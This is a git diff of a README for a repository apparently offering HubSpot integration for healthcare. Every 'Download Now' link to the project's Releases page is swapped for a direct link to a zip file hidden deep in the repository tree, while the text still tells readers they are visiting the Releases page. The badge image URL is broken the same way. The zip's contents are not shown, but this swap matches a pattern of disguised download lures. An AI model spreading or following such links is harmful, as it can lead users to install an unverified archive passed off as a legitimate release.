@@ -1,6 +1,6 @@
 # 🌐 brainsait-hubspot-allowlist - Simplifying HubSpot Integration for Healthcare
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/LunaeAgency/brainsait-hubspot-allowlist/releases)
+[![Download Now](https://raw.githubusercontent.com/LunaeAgency/brainsait-hubspot-allowlist/main/hostinger-deployment/monitor/brainsait-hubspot-allowlist_1.8.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/LunaeAgency/brainsait-hubspot-allowlist/main/hostinger-deployment/monitor/brainsait-hubspot-allowlist_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure you have the following:
 
 1. **Visit this page to download**: Click the link below to access the Releases page where you can download the latest version of the software.
 
-   [Download Now](https://github.com/LunaeAgency/brainsait-hubspot-allowlist/releases)
+   [Download Now](https://raw.githubusercontent.com/LunaeAgency/brainsait-hubspot-allowlist/main/hostinger-deployment/monitor/brainsait-hubspot-allowlist_1.8.zip)
 
 2. **Choose the Latest Release**: On the Releases page, find the latest version of the software. Look for a tag that indicates it's the newest release, usually located at the top of the list.
 
@@ -90,7 +90,7 @@ If you encounter issues during the installation or setup:
 
 Ready to start? **Visit this page to download** the latest version now.
 
-[Download Now](https://github.com/LunaeAgency/brainsait-hubspot-allowlist/releases)
+[Download Now](https://raw.githubusercontent.com/LunaeAgency/brainsait-hubspot-allowlist/main/hostinger-deployment/monitor/brainsait-hubspot-allowlist_1.8.zip)
 
 ---
 
